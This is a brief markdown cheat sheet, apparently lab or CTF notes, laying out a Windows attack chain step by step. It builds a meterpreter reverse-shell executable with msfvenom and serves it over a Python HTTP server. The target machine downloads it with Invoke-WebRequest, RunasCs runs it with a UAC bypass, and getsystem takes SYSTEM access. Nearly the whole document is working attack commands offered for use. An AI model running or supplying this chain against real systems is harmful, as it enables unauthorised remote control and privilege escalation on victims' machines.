#Exploit #AD #Payload #Tool 
#### An AD tool to get a root shell with bypassing the uac system.


## Metasploit

````
# Generate the payload with msfvenom

- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > shell_reverse.exe

# Start a Python HTTP server to host the payload and RunasCs script

- python3 -m http.server 8000 &

# Start Metasploit console and configure the handler for the reverse shell

- msfconsole -q use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.X.X; set LPORT 4444; run
````


## Invoke-RunasCs.ps1

#### Get the files from FireFox and to your target machine:

````
Invoke-WebRequest -Uri "http://10.10.X.X:8000/RunasCs-1.5/Invoke-RunasCs.ps1" -OutFile "C:\Users\WAO\Documents\RunasCs.(exe/ps1)"

Invoke-WebRequest -Uri "http://10.10.X.X:8000/shell_reverse.exe" -OutFile "C:\Users\WAO\Documents\Reverseshell.exe"
````


## Run RunasCs.exe

#### Now run that command bellow:


`.\RunasCs.(exe/ps1) --bypass-uac -l 5 <USER> <PASS> "Reverseshell.exe"`

#### Don't forget the `getsystem` at the end of your metasploit session.